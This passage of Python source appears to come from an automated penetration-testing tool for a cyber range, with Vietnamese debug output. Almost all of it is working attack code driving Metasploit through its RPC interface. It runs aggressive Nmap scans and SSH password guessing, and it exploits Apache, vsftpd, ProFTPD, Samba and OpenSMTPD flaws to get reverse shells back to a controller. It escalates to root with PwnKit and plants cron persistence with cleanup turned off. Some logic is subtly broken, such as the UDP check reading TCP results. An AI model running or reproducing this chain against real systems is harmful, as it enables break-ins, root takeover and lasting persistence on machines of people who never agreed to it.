            shell.write(GET_UID_CMD)

        time.sleep(1)
        response = shell.read()

        while (len(response) == 0):
            time.sleep(0.1)
            response = shell.read()

        if storyboard.ROOT.lower() in response:
            access = storyboard.ROOT
        else:
            access = storyboard.USER

        return access

    ###################################################################################
    def do_service_scan(self, host, nm, ports=False):
        """Perform the service scan
    
        Args
        ---------
        host (str) : host ip address that is used for service scan
        nm (NMap Scanner)
        ports (list): list required ports for scanning
    
        Returns
        -------
        services_name (list): list of service's name of current host
        """
    
        # Check port the existed of port
        # -Pn: Tells Nmap not to use ping to determine if the target is up
        # Nmap will do the requested scanning functions against every target IP specified, as if every one is active.
        # -n: Tells Nmap not to perform DNS resolution
        # -sS: Tells Nmap to use TCP SYN scanning
        # -T5: Nmap should use the most aggressive timing template
        # -sV: Nmap determine the details information about the services
    
        SCAN = 'scan'
        UDP = 'udp'
        TCP = 'tcp'
        NAME = 'name'
        PRODUCT = 'product'
        STATE = 'state'
        OPEN = 'open'
        ARGS = '-Pn -n -sS -sV -T5'
    
        services_scan = list()
        services_name = list()
    
        # In thông tin debug trước khi thực hiện scan
        print(f"[DEBUG] Bắt đầu quét dịch vụ trên host: {host} với ports={ports}")
        
        start = time.time()
    
        if ports:
            ports = ', '.join(str(port) for port in ports)
            print(f"[DEBUG] Thực hiện quét với các cổng cụ thể: {ports}")
            service_scan = nm.scan(host, ports, arguments=ARGS, sudo=True)
            services_scan.append(service_scan)
        else:
            print(f"[DEBUG] Thực hiện quét không chỉ định cổng")
            service_scan = nm.scan(host, arguments=ARGS, sudo=True)
            services_scan.append(service_scan)
        
        # In thông tin về kết quả quét nhận được từ nmap
        print(f"[DEBUG] Kết quả quét thu được: {service_scan}")
        
        end = time.time()
        execution_time = end - start
        print(f"[DEBUG] Thời gian thực hiện quét: {execution_time:.4f} giây")
    
        # In ra tổng số kết quả quét
        print(f"[DEBUG] Số lượng kết quả quét: {len(services_scan)}")
    
        for service_scan in services_scan:
            # In thông tin debug để kiểm tra cấu trúc của kết quả quét
            print(f"[DEBUG] Phân tích kết quả quét: {list(service_scan[SCAN].keys())}")
            
            # Get the list of service from the service scan result
            for ip in service_scan[SCAN].keys():
                print(f"[DEBUG] Xử lý IP: {ip}")
                ip_dict = service_scan[SCAN][ip]
    
                # Kiểm tra các dịch vụ UDP
                if UDP in ip_dict:
                    print(f"[DEBUG] Tìm thấy dịch vụ UDP: {list(ip_dict[UDP].keys())}")
                    for port_name in ip_dict[UDP]:
                        print(f"[DEBUG] Kiểm tra cổng UDP {port_name}")
                        if ip_dict[TCP][port_name][STATE] == OPEN:
                            service = ip_dict[UDP][port_name][NAME]
                            product = ip_dict[UDP][port_name][PRODUCT].lower()
                            print(f"[DEBUG] UDP - Cổng {port_name} mở: dịch vụ={service}, sản phẩm={product}")
                            services_name.append(service)
                            services_name.append(product)
    
                # Kiểm tra các dịch vụ TCP
                if TCP in ip_dict:
                    print(f"[DEBUG] Tìm thấy dịch vụ TCP: {list(ip_dict[TCP].keys())}")
                    for port_name in ip_dict[TCP]:
                        print(f"[DEBUG] Kiểm tra cổng TCP {port_name}")
                        if ip_dict[TCP][port_name][STATE] == OPEN:
                            service = ip_dict[TCP][port_name][NAME]
                            product = ip_dict[TCP][port_name][PRODUCT].lower()
                            print(f"[DEBUG] TCP - Cổng {port_name} mở: dịch vụ={service}, sản phẩm={product}")
                            services_name.append(service)
                            services_name.append(product)
    
        # In kết quả cuối cùng trước khi trả về
        print(f"[DEBUG] Kết quả cuối cùng: Dịch vụ phát hiện: {services_name}, thời gian thực thi: {execution_time:.4f}s")
        
        return services_name, end-start

    ###################################################################################
    def do_os_scan(self, host, nm, ports=False):
        """Perform the service scan
    
        Args
        ---------
        host (str) : host ip address that is used for service scan
        nm (Nmap Scanner)
        ports (list): list required ports for scanning
    
        Returns
        -------
        os_name (list): list of os name of current host
        """
    
        # Check port the existed of port
        # -Pn: tells Nmap not to use ping to determine if the target is up
        # Nmap will do the requested scanning functions against every target IP specified, as if every one is active.
        # -n: tells Nmap not to perform DNS resolution. 
        # -O: tells Nmap to perform operating system detection
        # -T5: Nmap should use the most aggressive timing template
    
        SCAN = 'scan'
        OSMATCH = 'osmatch'
        NAME = 'name'
        ARGS = '-Pn -n -O -T5'
    
        os_scan_list = list()
        os_name = list()
    
        # In thông tin debug trước khi thực hiện scan
        print(f"[DEBUG] Bắt đầu quét OS trên host: {host} với ports={ports}")
        
        start = time.time()
    
        if ports:
            ports = ', '.join(str(port) for port in ports)
            print(f"[DEBUG] Thực hiện quét với các cổng cụ thể: {ports}")
            osscan = nm.scan(host, ports, arguments=ARGS, sudo=True)
            os_scan_list.append(osscan)
        else:
            print(f"[DEBUG] Thực hiện quét không chỉ định cổng")
            osscan = nm.scan(host, arguments=ARGS, sudo=True)
            os_scan_list.append(osscan)
        
        # In thông tin về kết quả quét nhận được từ nmap
        print(f"[DEBUG] Kết quả quét thu được: {osscan}")
        
        end = time.time()
        execution_time = end-start
        print(f"[DEBUG] Thời gian thực hiện quét: {execution_time:.4f} giây")
    
        for osscan in os_scan_list:
            # In thông tin debug để kiểm tra cấu trúc của kết quả quét
            print(f"[DEBUG] Phân tích kết quả quét: {list(osscan[SCAN].keys())}")
            
            # Get the os list from os scan result
            for key in osscan[SCAN].keys():
                # In thông tin debug về OSMATCH thu được
                if OSMATCH in osscan[SCAN][key]:
                    print(f"[DEBUG] OSMATCH cho {key}: {osscan[SCAN][key][OSMATCH]}")
                else:
                    print(f"[DEBUG] Không tìm thấy OSMATCH cho {key}")
                    
                osmatch = osscan[SCAN][key][OSMATCH]
                if osmatch: 
                    os = osmatch[0][NAME]
                    os_type = os.split(' ',1)[0].lower()
                    os_name.append(os_type)
                    print(f"[DEBUG] Đã tìm thấy OS: {os} -> Trích xuất OS type: {os_type}")
                else:
                    print(f"[DEBUG] Không thể xác định OS cho {key}")
    
        # In kết quả cuối cùng trước khi trả về
        print(f"[DEBUG] Kết quả cuối cùng: OS phát hiện: {os_name}, thời gian thực thi: {execution_time:.4f}s")
        
        return os_name, execution_time

    ###################################################################################
    def do_exploit(self, host, host_ip_list, service):
        """Do exploit on target host
    
        Args
        ---------
        host (str) : host ip address that is used for exploit
        host_ip_list (list): List of host IP addresses
    
        Returns
        -------
        shell (ShellSession): shell session of current host
        access (str): access level after exploiting
        """
    
        # In thông tin đầu vào
        print(f"[DEBUG EXPLOIT] Bắt đầu khai thác: host={host}, service={service}")
        print(f"[DEBUG EXPLOIT] Danh sách IP mục tiêu: {host_ip_list}")
        
        arch = None
        start = time.time()
    
        msfrpc = utils.msfrpc_client
        if not msfrpc:
            end = time.time()
            print("[DEBUG EXPLOIT] Lỗi: Không có kết nối msfrpc_client")
            return None, None, end-start
    
        # In thông tin trước khi chọn loại exploit
        print(f"[DEBUG EXPLOIT] Chuẩn bị thực hiện khai thác dịch vụ: {service}")
        
        if service == storyboard.SSH:
            print("[DEBUG EXPLOIT] Sử dụng khai thác SSH")
            result = self.do_e_ssh(msfrpc, host)
        elif service == storyboard.FTP:
            print("[DEBUG EXPLOIT] Sử dụng khai thác FTP")
            arch = utils.storyboard.CMD
            result = self.do_e_ftp(msfrpc, host)
        elif service == storyboard.HTTP:
            print("[DEBUG EXPLOIT] Sử dụng khai thác HTTP")
            arch = utils.storyboard.X64
            # print("[DEBUG EXPLOIT]: Mock success exploit HTTP")
            # NOTE: Mock exploit for HTTP - success
            result = self.do_e_http(msfrpc, host)
            # result = {
            #     'job_id': 1
            # }
        elif service == storyboard.SAMBA:
            print("[DEBUG EXPLOIT] Sử dụng khai thác SAMBA")
            arch = utils.storyboard.CMD
            result = self.do_e_samba(msfrpc, host)
        elif service == storyboard.SMTP:
            print("[DEBUG EXPLOIT] Sử dụng khai thác SMTP")
            arch = utils.storyboard.CMD
            result = self.do_e_smtp(msfrpc, host)
        else:
            logging.debug(f"Exploit action is not existed")
            print(f"[DEBUG EXPLOIT] Không tìm thấy hành động khai thác cho dịch vụ: {service}")
            return None, None, time.time() - start
    
        # In thông tin kết quả nhận được từ exploit
        print(f"[DEBUG EXPLOIT] Kết quả khai thác nhận được: {result}")
    
        # Get the job id on success
        job_id = self.parse_exploit_result(result)
        print(f"[DEBUG EXPLOIT] Job ID nhận được: {job_id}")
    
        if not job_id:
            end = time.time()
            print("[DEBUG EXPLOIT] Lỗi: Không lấy được job_id")
            return None, None, end-start
    
        elif service == utils.storyboard.SSH:
            # Must wait until job completes to ensure the session is created
            print("[DEBUG EXPLOIT] Đợi hoàn thành job SSH...")
            while job_id in msfrpc.jobs.list:
                time.sleep(0.1)
            shell_id = self.get_current_shell_id(msfrpc, host_ip_list, service)
            print(f"[DEBUG EXPLOIT] Shell ID SSH nhận được: {shell_id}")
    
        else:
            flag = True # Stop when shell is created or job is finished
            print(f"[DEBUG EXPLOIT] Đợi tạo shell cho dịch vụ {service}...")
            attempts = 0
            while flag:
                attempts += 1
                if attempts % 10 == 0:  # In sau mỗi 10 lần thử
                    print(f"[DEBUG EXPLOIT] Vẫn đang đợi shell... lần thử {attempts}")
    
                if (job_id not in msfrpc.jobs.list):
                    # # NOTE: Mock result for HTTP exploit
                    # if service != storyboard.HTTP:
                    #     print(f"[DEBUG EXPLOIT] CẢNH BÁO: Job {job_id} không còn tồn tại")
                    #     print(f"[DEBUG EXPLOIT] Danh sách session: {msfrpc.sessions.list}")
                    print(f"[DEBUG EXPLOIT] CẢNH BÁO: Job {job_id} không còn tồn tại")
                    print(f"[DEBUG EXPLOIT] Danh sách session: {msfrpc.sessions.list}")
                    flag = False
    
                # Get shell id from msfrpc sesions list
                shell_id = self.get_current_shell_id(msfrpc, host_ip_list, service, arch)
                if shell_id:
                    print(f"[DEBUG EXPLOIT] Đã tìm thấy shell ID: {shell_id}")
                    flag = False
                    break
    
                end = time.time()
                # Thêm timeout để tránh vòng lặp vô hạn
                if end - start > 60:  # 60 giây timeout
                    print(f"[DEBUG EXPLOIT] Quá thời gian chờ shell (60s)")
                    flag = False
    
        end = time.time()
        print(f"[DEBUG EXPLOIT] Thời gian thực hiện: {end-start:.2f} giây")
    
        # Stop the job id
        print(f"[DEBUG EXPLOIT] Dừng job ID: {job_id}")
        msfrpc.jobs.stop(job_id)
    
        # Get the access level
        if shell_id:
            print(f"[DEBUG EXPLOIT] Lấy mức truy cập cho shell ID: {shell_id}")
            shell = msfrpc.sessions.session(shell_id)
            access = self.get_access_level(shell)
            print(f"[DEBUG EXPLOIT] Mức truy cập nhận được: {access}")
            return shell, access, end-start
        else:
            logging.debug(f"Shell for host {host} could not be created")
            print(f"[DEBUG EXPLOIT] Không thể tạo shell cho host {host}")
            return None, None, end-start

    def do_e_ssh(self, msfrpc, host, timeout=60, DEBUG=False):
        """Do ssh-based exploit on target host and get results

        Args
        ---------
        msfrpc (MsfRpcClient): msfrpc client
        host (str): host ip address that is used for exploit
        timeout (int): maximum time to wait for job completion (seconds)
        DEBUG (bool): if True, run with console output for detailed logging

        Returns
        -------
        dict or str: Results containing job status and information (dict if DEBUG=False, str with console output if DEBUG=True)
        """
        import time

        # In ra IP host mục tiêu để debug
        print(f"[DEBUG] Bắt đầu tấn công SSH vào host: {host}")
        
        # Get information for e_ssh action
        ssh_account = utils.config_info[storyboard.CYBER_RANGE][storyboard.GUEST_SETTINGS][storyboard.TASKS][storyboard.ADD_ACCOUNT][storyboard.SSH]

        username = ssh_account[storyboard.ACCOUNT]
        pass_file = utils.replace_file_path(database=utils.config_info,
                                        file_name=ssh_account[storyboard.PWD_FILE])

        # In ra username và pass_file để debug
        print(f"[DEBUG] Username: {username}, Password file: {pass_file}")
        
        # Khởi tạo các tham số module
        module_args = {
            storyboard.RHOSTS: host,
            storyboard.USERNAME: username,
            storyboard.PASS_FILE: pass_file,
            storyboard.SSH_TIMEOUT: 3
        }
        
        # In ra tất cả các tham số module để debug
        print(f"[DEBUG] Module arguments: {module_args}")
        
        if DEBUG:
            # Chạy với output console để debug
            # Tạo console mới
            console_id = msfrpc.consoles.console().cid
            console = msfrpc.consoles.console(console_id)
            
            print(f"[DEBUG] Đã tạo console mới với ID: {console_id}")
            
            # Chọn module SSH login
            console.write('use auxiliary/scanner/ssh/ssh_login')
            
            # Thiết lập các tham số từ module_args thay vì hardcode
            for param_name, param_value in module_args.items():
                # Gửi lệnh thiết lập tham số đến console
                console.write(f'set {param_name} {param_value}')
                print(f"[DEBUG] Đã thiết lập {param_name}={param_value}")
            
            # Chạy module
            print("[DEBUG] Bắt đầu chạy module SSH login")
            console.write('run')
            
            # Wait for the console to finish and collect output
            output = ""
            start_time = time.time()
            
            print(f"[DEBUG] Đang chờ module hoàn thành (timeout: {timeout}s)")
            
            while console.is_busy() and time.time() - start_time < timeout:
                time.sleep(1)
                new_output = console.read()
                output += new_output['data']
                # Print real-time output for easier debugging
                if new_output['data'].strip():
                    print(new_output['data'].strip())
            
            # In ra thời gian đã trôi qua
            elapsed_time = time.time() - start_time
            print(f"[DEBUG] Thời gian thực thi: {elapsed_time:.2f}s")
            
            print("[DEBUG] Kiểm tra sessions hiện có:")
            sessions = msfrpc.sessions.list
            print(f"[DEBUG] Số lượng sessions: {len(sessions)}")
            for session_id, session_info in sessions.items():
                print(f"[DEBUG] Session {session_id}: {session_info.get('type')} - {session_info.get('target_host')}")
                
            # Destroy the console when done
            msfrpc.consoles.destroy(console_id)
            print(f"[DEBUG] Đã hủy console {console_id}")
            
            return {
                "job_id": 'console',
            }
        else:
            # Execute exploit module normally (original behavior)
            print("[DEBUG] Chạy mode không debug, sử dụng API trực tiếp")
            exploit_ssh = msfrpc.modules.use('auxiliary', 'scanner/ssh/ssh_login')
            
            exploit_ssh[storyboard.RHOSTS] = host
            exploit_ssh[storyboard.USERNAME] = username
            exploit_ssh[storyboard.PASS_FILE] = pass_file
            exploit_ssh[storyboard.SSH_TIMEOUT] = 3

            print("[DEBUG] Thực thi module SSH login")
            result = exploit_ssh.execute()
            
            # In ra kết quả trả về từ API
            print(f"[DEBUG] Kết quả từ API: {result}")
            
            # Kiểm tra xem có job_id không
            if "job_id" in result:
                print(f"[DEBUG] Job ID: {result['job_id']}")
                
                # Đợi job hoàn thành
                print("[DEBUG] Đang đợi job hoàn thành")
                start_time = time.time()
                job_completed = False
                
                while time.time() - start_time < timeout and not job_completed:
                    if result["job_id"] not in msfrpc.jobs.list:
                        job_completed = True
                        print("[DEBUG] Job đã hoàn thành")
                    time.sleep(1)
                    
                if not job_completed:
                    print("[DEBUG] Job chưa hoàn thành trong thời gian cho phép")
            else:
                print("[DEBUG] Không tìm thấy job_id trong kết quả")
            
            return result


    def do_e_http(self, msfrpc, host):
        """Do http-based exploit on target host

        Args
        ---------
        msfrpc (MsfRpcClient): msfrpc client
        host (str) : host ip address that is used for exploit

        Returns
        -------
        result (dict): The result after executing the exploit module
        """

        # Execute exploit module to create the shell
        exploit_apache = msfrpc.modules.use('exploit', 'multi/http/apache_normalize_path_rce')
        exploit_apache[storyboard.RHOSTS] = host
        exploit_apache[storyboard.RPORT] = 80
        exploit_apache[storyboard.SSL_MODULE_ARG] = False

        payload = msfrpc.modules.use('payload', 'linux/x64/shell/reverse_tcp')
        payload[storyboard.LHOST] = utils.config_info[storyboard.HOST_MGMT_ADDR]

        result = exploit_apache.execute(payload=payload)

        return result

    def do_e_ftp(self, msfrpc, host):
        """Do ftp-based exploit on target host

        Args
        ---------
        msfrpc (MsfRpcClient): msfrpc client
        host (str) : host ip address that is used for exploit

        Returns
        -------
        result (dict): The result after executing the exploit module
        """

        # Execute exploit module to create the shell
        exploit_ftp = msfrpc.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
        exploit_ftp[storyboard.RHOSTS] = host
        exploit_ftp[storyboard.WFSDElAY] = 120

        payload = msfrpc.modules.use('payload', 'cmd/unix/interact')
        result = exploit_ftp.execute(payload=payload)

        return result

    def do_e_samba(self, msfrpc, host):
        """Do samba-based exploit on target host

        Args
        ---------
        msfrpc (MsfRpcClient): msfrpc client
        host (str) : host ip address that is used for exploit

        Returns
        -------
        result (dict): The result after executing the exploit module
        """

        # Execute exploit module to create the shell
        exploit_samba = msfrpc.modules.use('exploit', 'linux/samba/is_known_pipename')
        exploit_samba[storyboard.RHOSTS] = host
        exploit_samba[storyboard.SMB_FOLDER] = '/home/shared' # This path is the same with share path in samba configuration scrript
        exploit_samba[storyboard.FAKE_BIND] = False

        payload = msfrpc.modules.use('payload', 'cmd/unix/interact')

        result = exploit_samba.execute(payload=payload)

        return result

    def do_e_smtp(self, msfrpc, host):
        """Do smtp-based exploit on target host

        Args
        ---------
        msfrpc (MsfRpcClient): msfrpc client
        host (str) : host ip address that is used for exploit

        Returns
        -------
        result (dict): The result after executing the exploit module
        """

        # Execute exploit module to create the shell
        exploit_smtp = msfrpc.modules.use('exploit', 'unix/smtp/opensmtpd_mail_from_rce')
        exploit_smtp[storyboard.RHOSTS] = host
        exploit_smtp[storyboard.AUTO_CHECK] = False
        exploit_smtp[storyboard.FORCE_EXPLOIT] = True
        exploit_smtp[storyboard.EXPECT_TIMEOUT] = 5
        exploit_smtp[storyboard.CONNECT_TIMEOUT] = 50

        payload = msfrpc.modules.use('payload', 'cmd/unix/reverse_netcat')
        payload[storyboard.LHOST] = utils.config_info[storyboard.HOST_MGMT_ADDR]
        payload[storyboard.LPORT] = 4444 # Default value in Metasploit

        result = exploit_smtp.execute(payload=payload)

        return result

    ###################################################################################
    def do_process_scan(self):
        """Do process scan on current host
    
        Returns
        -------
        process_list (list): list of current processes
        """
        print(f"[DEBUG] Bắt đầu quét tiến trình trên máy {self.address}")
    
        PROCESS_SCAN_SHELL = 'ps -ef'
        flag_process = '/sbin/init' # Use to wait for getting all processes
        process_list = list()
    
        start = time.time()
        print(f"[DEBUG] Thời gian bắt đầu: {start}")
    
        # Get the existed shell session from the target host
        session = utils.host_map[self.address][storyboard.SHELL]
        print(f"[DEBUG] host map: {utils.host_map}")
        print(f"[DEBUG] Thực thi lệnh: {PROCESS_SCAN_SHELL}")
        session.write(PROCESS_SCAN_SHELL)
        time.sleep(1)
        response = session.read()
        print(f"[DEBUG] Kết quả ban đầu: {response[:100]}...")
    
        while (flag_process not in response):
            print(f"[DEBUG] Đang đợi '{flag_process}', tiếp tục đọc...")
            time.sleep(1)
            response = session.read() + response
            print(f"[DEBUG] Độ dài response hiện tại: {len(response)} bytes")
    
            # Stop condition
            if (time.time() - start > 30):
                print("Over time: ", response)
                break
    
        print(f"[DEBUG] Đã tìm thấy '{flag_process}' hoặc hết thời gian")
        process_list = response.split('\n')
        print(f"[DEBUG] Số lượng tiến trình tìm thấy: {len(process_list)}")
    
        end = time.time()
        print(f"[DEBUG] Thời gian thực thi: {end-start:.2f} giây")
        return process_list, end-start

    ###################################################################################
    def do_privilege_escalation(self, host_ip_list, process):
        """Do privilege escalation on target host
    
        Args
        ---------
        host_ip_list (list) : list of ip addresses in current host
        process (str) : process name to use for privilege escalation
    
        Returns
        -------
        shell/meterpreter (ShellSession/MeterpreterSession): shell or meterpreter session of current host
        access (str): access level after exploiting
        exec_time (float): execution time
        """
    
        start = time.time()
        print(f"[DEBUG PE] Bắt đầu thực hiện privilege escalation với process: {process}")
        print(f"[DEBUG PE] Danh sách IP của host: {host_ip_list}")
    
        # Lấy kết nối msfrpc
        msfrpc = utils.msfrpc_client
        if not msfrpc:
            end = time.time()
            print("[DEBUG PE] Lỗi: Không có kết nối msfrpc_client")
            print("* WARNING: MSF RPC client is not defined")
            return None, None, end-start
    
        print(f"[DEBUG PE] Đã kết nối msfrpc_client thành công")
        print(f"[DEBUG PE] Đang tìm shell_id hiện tại...")
    
        # Lấy shell id hiện tại
        shell_id = self.get_current_shell_id(msfrpc, host_ip_list)
    
        # Kiểm tra shell_id có tồn tại không
        if shell_id is None:
            end = time.time()
            print("[DEBUG PE] Lỗi: Không tìm thấy shell id hiện tại")
            print("* WARNING: Exploit shell is not exited.")
            return None, None, end-start
    
        print(f"[DEBUG PE] Đã tìm thấy shell_id: {shell_id}")
        print(f"[DEBUG PE] Bắt đầu thực hiện PE cho process: {process}")
    
        # Thực hiện PE dựa trên loại process
        session_id = None
        job_id = None
        
        if process == storyboard.TOMCAT:
            print(f"[DEBUG PE] Thực hiện PE cho TOMCAT sử dụng pkexec")
            session_id, exec_time, job_id = self.do_pe_pkexec(msfrpc, host_ip_list, shell_id)
            print(f"[DEBUG PE] Kết quả PE TOMCAT: session_id={session_id}, job_id={job_id}, thời gian={exec_time}")
        elif process == storyboard.PROFTPD:
            print(f"[DEBUG PE] Thực hiện PE cho PROFTPD")
            session_id, exec_time = self.do_pe_proftpd(msfrpc, host_ip_list)
            print(f"[DEBUG PE] Kết quả PE PROFTPD: session_id={session_id}, thời gian={exec_time}")
        elif process == storyboard.CRON:
            print(f"[DEBUG PE] Thực hiện PE cho CRON")
            session_id, exec_time = self.do_pe_cron(msfrpc, host_ip_list, shell_id)
            print(f"[DEBUG PE] Kết quả PE CRON: session_id={session_id}, thời gian={exec_time}")
        else:
            print(f"[DEBUG PE] Không tìm thấy phương thức PE cho process: {process}")
            logging.debug(f"Privilege Escalation action is not existed")
            end = time.time()
            exec_time = end-start
            print(f"[DEBUG PE] Kết thúc với thời gian: {exec_time}")
    
        # Kiểm tra kết quả và lấy access level
        if session_id:
            print(f"[DEBUG PE] Đã nhận được session_id: {session_id}, lấy thông tin access level")
            shell = msfrpc.sessions.session(session_id)
            
            # Kiểm tra thông tin session
            session_info = msfrpc.sessions.list.get(session_id, {})
            print(f"[DEBUG PE] Thông tin session: type={session_info.get('type', 'unknown')}, info={session_info}")
            
            # Lấy access level
            access = self.get_access_level(shell)
            print(f"[DEBUG PE] Mức truy cập đạt được: {access}")
            
            # Dọn dẹp nếu là Meterpreter session
            if (isinstance(shell, MeterpreterSession)):
                print(f"[DEBUG PE] Session là MeterpreterSession, dừng session và job")
                shell.stop()
                if job_id:
                    msfrpc.jobs.stop(job_id)
                    print(f"[DEBUG PE] Đã dừng job {job_id}")
                else:
                    print(f"[DEBUG PE] Không có job_id để dừng")
                    
            print(f"[DEBUG PE] PE thành công, trả về shell, access={access}, thời gian={exec_time}")
            return shell, access, exec_time
        else:
            print(f"[DEBUG PE] PE thất bại, không tạo được shell")
            print(f"Shell for host {self.address} could not be created")
            return None, None, exec_time

    def do_pe_proftpd(self, msfrpc, host_ip_list):
        """Do proftpd-based privilege escalation on hosts in list

        Args
        ---------
        msfrpc (MsfRpcClient): msfrpc client
        host_ip_list (list): list of host that is used for do pe

        Returns
        -------
        shell_id (int): id of shell session of current host
        """

        shell_id = None
        start = time.time()

        for host in host_ip_list:
            pe_proftpd = msfrpc.modules.use('exploit', 'unix/ftp/proftpd_133c_backdoor')
            pe_proftpd[storyboard.RHOSTS] = host
            pe_proftpd[storyboard.RPORT] = 2121

            payload = msfrpc.modules.use('payload', 'cmd/unix/reverse')
            payload[storyboard.LHOST] = utils.config_info[storyboard.HOST_MGMT_ADDR]
            payload[storyboard.LPORT] = 4444

            result = pe_proftpd.execute(payload=payload)
            # Get the job id on success
            job_id = self.parse_exploit_result(result)

            if not job_id:
                end = time.time()
                print("None in not job_id")
                return None, end-start
            else:
                flag = True # Stop when shell is created or job is finished
                while flag:

                    if (job_id not in msfrpc.jobs.list):
                        print("* WARNING: Job does not exist")
                        print(msfrpc.sessions.list)
                        flag = False

                    # Get shell id from msfrpc sesions list
                    shell_id = self.get_current_shell_id(msfrpc, host_ip_list, storyboard.PROFTPD, arch=storyboard.CMD)
                    if shell_id:
                        flag = False
                        break

                    end = time.time()

            end = time.time()

            msfrpc.jobs.stop(job_id)

            if shell_id:
                break

        return shell_id, end-start

    def do_pe_cron(self, msfrpc, host_ip_list, shell_id):
        """Do cron-based privilege escalation on hosts in list

        Args
        ---------
        msfrpc (MsfRpcClient): msfrpc client
        host_ip_list (list): list of host that is used for do pe
        shell_id (int): id of the shell of current host

        Returns
        -------
        shell_id (int): id of shell session of current host
        """
        start = time.time()

        exploit_cron = msfrpc.modules.use('exploit', 'linux/local/cron_persistence')
        exploit_cron[storyboard.SESSION] = int(shell_id)
        exploit_cron[storyboard.VERBOSE] = False
        exploit_cron[storyboard.CLEANUP] = False
        exploit_cron[storyboard.WFSDElAY] = 65

        payload = msfrpc.modules.use('payload', 'cmd/unix/reverse_python')
        payload[storyboard.LHOST] = utils.config_info[storyboard.HOST_MGMT_ADDR]

        result = exploit_cron.execute(payload=payload)
        job_id = self.parse_exploit_result(result)

        if not job_id:
            end = time.time()
            print("* WARNING: Shell job could not be created")
            return None, end-start
        else:
            flag = True # Stop when meterpreter is created or job is finished
            while flag:

                if (job_id not in msfrpc.jobs.list):
                    print("* WARNING: Job does not exist")
                    print(msfrpc.sessions.list)
                    flag = False

                shell_id = self.get_current_shell_id(msfrpc, host_ip_list, storyboard.CRON, arch=storyboard.CMD)

                end = time.time()

        end = time.time()
        msfrpc.jobs.stop(job_id)

        return shell_id, end-start

    def do_pe_pkexec(self, msfrpc, host_ip_list, shell_id):
        """Do pkexec-based privilege escalation on hosts in list

        Args
        ---------
        msfrpc (MsfRpcClient): msfrpc client
        host_ip_list (list): list of host that is used for do pe
        shell_id (int): id of the shell of current host

        Returns
        -------
        meterpreter_id (int): id of meterpreter session of current host
        """
        start = time.time()

        meterpreter_id = None

        # Gain root access
        exploit_pkexec = msfrpc.modules.use('exploit','linux/local/cve_2021_4034_pwnkit_lpe_pkexec')
        exploit_pkexec[storyboard.SESSION] = int(shell_id)
        exploit_pkexec[storyboard.AUTO_CHECK] = False
        exploit_pkexec[storyboard.FORCE_EXPLOIT] = True

        payload = msfrpc.modules.use('payload', 'linux/x64/meterpreter/reverse_tcp')
        payload[storyboard.LHOST] = utils.config_info[storyboard.HOST_MGMT_ADDR]
        payload[storyboard.LPORT] = 4444

        result = exploit_pkexec.execute(payload=payload)
        job_id = self.parse_exploit_result(result)

        if not job_id:
            end = time.time()
            print("* WARNING: Meterpreter job could not be created")
            return None, end-start
        else:
            flag = True # Stop when meterpreter is created or job is finished
            while flag:

                if (job_id not in msfrpc.jobs.list):
                    print("* WARNING: Meterpreter job does not exist")
                    print(msfrpc.sessions.list)
                    flag = False

                # Get meterpreterr id from msfrpc sesions list
                for host in host_ip_list:
                    meterpreter_id = self.get_existed_meterpreter_id(msfrpc, host, storyboard.PKEXEC)
                    if meterpreter_id:
                        flag = False
                        break

                end = time.time()

            end = time.time()

        return meterpreter_id, end-start, job_id

